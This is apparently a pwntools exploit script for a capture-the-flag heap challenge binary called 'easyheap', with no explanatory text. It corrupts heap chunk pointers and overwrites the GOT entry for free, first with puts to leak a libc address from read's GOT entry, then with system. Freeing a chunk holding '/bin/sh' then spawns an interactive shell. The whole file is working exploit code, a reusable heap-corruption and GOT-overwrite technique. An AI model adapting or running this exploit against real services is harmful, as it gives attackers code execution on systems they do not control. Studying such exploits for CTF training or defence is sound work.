#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./easyheap")
	elf = ELF("./easyheap")
	libc = ELF('./libc.so.6')
else:
	p = remote()
	elf = ELF("./easyheap")
	libc = ELF('./libc.so.6')


def add(size,content='0'):
	sla('choice:\n','1')
	sla('message?\n',str(size))
	if(content!='0'):
		sda('message?\n',content)
def delete(idx):
	sla('choice:\n','2')
	sla('deleted?\n',str(idx))
def edit(idx,content):
	sla('choice:\n','3')
	sla('modified?\n',str(idx))
	sda('message?\n',content)

free_got = elf.got['free']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
free_times = 0x6020AC

###leak libc###
add(0x60,'AAAA')
add(0x60,'BBBB')
add(0x60,'CCCC')

delete(0)
delete(1)
delete(2)

add(0x410,'0')#0 ptr2
add(0x410,'0')#1 ptr1
add(0x410,'0')#2 ptr0

payload = p64(0) + p64(0x21) + p64(free_got)
edit(1,payload)
edit(2,p64(puts_plt))

payload = p64(0) + p64(0x21) + p64(free_times)
edit(0,payload)
edit(1,p32(0))        #modify free times


payload = p64(0) + p64(0x21) + p64(read_got)
edit(0,payload)

delete(1)
read = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
libc_base = read - libc.symbols['read']

success(hex(libc_base))

###modify GOT###
system = libc_base + libc.symbols['system']

edit(2,p64(system))
success(hex(system))
add(0x80,'/bin/sh\x00')#1

delete(1)

###get shell###
ia()